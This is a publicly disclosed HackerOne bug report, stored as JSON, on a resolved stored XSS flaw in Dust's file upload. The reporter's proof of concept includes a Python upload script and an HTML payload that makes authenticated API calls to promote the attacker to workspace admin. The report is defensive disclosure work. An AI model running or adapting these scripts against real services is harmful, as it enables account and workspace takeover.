@@ -1,0 +1,158 @@
+{
+  "id": 3115705,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTE1NzA1",
+  "url": "https://hackerone.com/reports/3115705",
+  "title": "Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-04-28T11:26:37.709Z",
+  "submitted_at": "2025-04-28T11:26:38.120Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sjalu",
+    "url": "/sjalu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/p2czxdswoobm21hjo7zo2skqidua/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 96398,
+    "url": "https://hackerone.com/dust",
+    "handle": "dust",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/g9pcp90s23rz0kq1duus45xaaov9/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/g9pcp90s23rz0kq1duus45xaaov9/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Dust",
+      "twitter_handle": "dust4ai",
+      "website": "http://dust.tt",
+      "about": "Dust is building an enterprise agent operating system, allowing teams to augment internal workflows with easy-to-customise and context-aware AI."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-05-02T12:01:14.166Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-04-29T18:47:41.075Z",
+  "team_member_agreed_on_going_public_at": "2025-05-02T12:01:13.715Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nA stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality.\n\nAn attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.\n\nThis allows an attacker to issue authenticated API requests on behalf of the victim, including:\n\t•\tPromoting their own account to Admin\n\t•\tDowngrading or removing legitimate admins\n\t•\tAccessing and deleting secrets\n\t•\tFull control over the workspace\n\nThe attack requires the victim to be a member of the same workspace and visit the malicious file URL. Once triggered, the attacker can fully compromise the workspace.\n\n## Steps To Reproduce:\n\n  1. Set up a workspace where you are admin.\n 2. Invite a dummy account with the normal member role.\n  3. Upload the malicious file on the dummy account using the Python script below. Use the HTML found at the bottom for upload.\n```python\nimport requests\nfrom requests_toolbelt.multipart.encoder import MultipartEncoder\n\ncookies = {\n    'appSession': '<dummy_account_session>',\n}\n\njson_data = {\n    'contentType': 'text/html',\n    'fileName': 'xss_poc.png',\n    'fileSize': 7331,\n    'useCase': 'conversation'\n}\n\nresponse = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)\nprint(response.text)\n\nuploadUrl = response.json()['file']['uploadUrl']\n\ncookies = {\n    'appSession': '<dummy_account_session>',\n}\n\nm = MultipartEncoder(\n    fields={\n        'file': (\n            'xss_poc.png',  # Filename\n            open('Dust/xss.html', 'rb'),  # File object\n            'text/html'  # Content-Type\n        )\n    }\n)\n\nheaders = {\n    'accept': '*/*',\n    'accept-language': 'nb-NO,nb;q=0.9,no;q=0.8,nn;q=0.7,en-US;q=0.6,en;q=0.5',\n    'cache-control': 'no-cache',\n    'content-type': m.content_type,  # This will correctly set boundary\n    'origin': 'https://dust.tt',\n    'pragma': 'no-cache',\n    'priority': 'u=1, i',\n    'referer': 'https://dust.tt/w/<workspace_sid>/assistant/new',\n    'sec-ch-ua': '\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"',\n    'sec-ch-ua-mobile': '?0',\n    'sec-ch-ua-platform': '\"macOS\"',\n    'sec-fetch-dest': 'empty',\n    'sec-fetch-mode': 'cors',\n    'sec-fetch-site': 'same-origin',\n    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',\n}\n\n# Make the request\nresponse = requests.post(\n    url=uploadUrl,\n    headers=headers,\n    cookies=cookies,\n    data=m  \n)\n\nprint(f'[*] URL TO SHARE:\\n{response.json()[\"file\"][\"downloadUrl\"]}?action=view')\n```\n  4. Share the URL with the workspace admin account.\n 5. When the victim visits the link, your script runs automatically, promoting the dummy account to Admin. \n\nHTML File:\n```html\n<html>\n<head>\n  <title>PoC - Dust Workspace Takeover</title>\n  <style>\n    body {\n      font-family: Arial, sans-serif;\n      margin: 40px;\n      background-color: #f8f9fa;\n    }\n    .container {\n      background: white;\n      padding: 20px;\n      border-radius: 8px;\n      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);\n    }\n    h1 {\n      color: #333;\n    }\n    p {\n      color: #555;\n    }\n  </style>\n</head>\n\n<body>\n  <div class=\"container\">\n    <h1>Proof of Concept - Dust Workspace Admin Takeover</h1>\n    <p>When this page is visited by an admin inside a workspace, he'll give the attacker's user ID admin privileges. The attacker can then manually de-rank the former admin to a regualar member.</p>\n  </div>\n\n<script>\n// Your user ID here (dummy account's ID)\nconst attackerUserId = '<dummy_id>'; // <-- replace with dummy account ID!\n\nfetch('https://dust.tt/api/user', {\n    method: 'GET',\n    headers: {\n        'accept': '*/*',\n        'x-commit-hash': '41c0391',\n    },\n    credentials: 'include'\n})\n.then(res => res.json())\n.then(userData => {\n    if (userData.user && userData.user.workspaces && userData.user.workspaces.length > 0) {\n        const workspaceId = userData.user.workspaces[0].sId; // Get workspace ID\n        const victimUserId = userData.user.id; // Victim's own ID\n\n        // 1. Promote attacker to admin\n        fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {\n            method: 'POST',\n            headers: {\n                'content-type': 'application/json',\n                'accept': '*/*',\n                'x-commit-hash': '41c0391',\n            },\n            credentials: 'include',\n            body: JSON.stringify({\n                role: \"admin\"\n            })\n        });\n\n        alert(`PWNED\\n\\nVictim Username: ${userData.user.username}\\nVictim Email: ${userData.user.email}`);\n    }\n});\n</script>\n</body>\n</html>\n```\n\n## Impact\n\nThis vulnerability allows an attacker to execute arbitrary JavaScript in the browser of any user within the same workspace who visits a malicious link. Through this, the attacker can perform any actions on behalf of the victim user, leveraging their active session without needing to steal or view the session cookie itself. An attacker view  (only key, not value - value is hidden for everyone) and delete private secrets, access internal data, modify settings, and if the victim has administrative privileges, escalate their own account to an admin role and revoke admin rights from others. This results in a full compromise of the user account, potential privilege escalation, and takeover of the entire workspace. The overall security impact is critical.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 115,
+  "voters": [
+    "k0ns0l",
+    "0xtarun",
+    "echopwn",
+    "0xotachi",
+    "loaymorad",
+    "orange303",
+    "defenderwww",
+    "googlelai",
+    "starlox",
+    "0-chrollo-0",
+    "and 105 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 839747,
+    "asset_type": "URL",
+    "asset_identifier": "https://dust.tt/api/v1",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 682296,
+      "category": "researcher",
+      "content": "A stored Cross-Site Scripting (XSS) vulnerability exists in Dust’s file upload functionality, allowing an attacker to execute arbitrary JavaScript in the context of other workspace members’ browsers. By uploading a malicious HTML file and convincing another user to interact with it, an attacker can fully impersonate that user and perform any actions available to them without stealing their cookies. If the victim holds administrative privileges, the attacker can escalate their own permissions, revoke others’ access, read sensitive data, and take full control over the workspace. The impact is critical and can lead to full account and organizational takeover.",
+      "updated_at": "2025-04-28T11:29:00.179Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 3920422,
+        "username": "sjalu",
+        "name": "Hans Grønskag Hammer",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://borgsecurity.io",
+        "location": "",
+        "created_at": "2025-04-28T10:57:29.289Z",
+        "url": "https://hackerone.com/sjalu",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/p2czxdswoobm21hjo7zo2skqidua/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/p2czxdswoobm21hjo7zo2skqidua/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/p2czxdswoobm21hjo7zo2skqidua/fba683f28d17594d98b39d87e2b3aa09acb938c22d49b206f663ae961dc39adc"
+        }
+      }
+    }
+  ]
+}
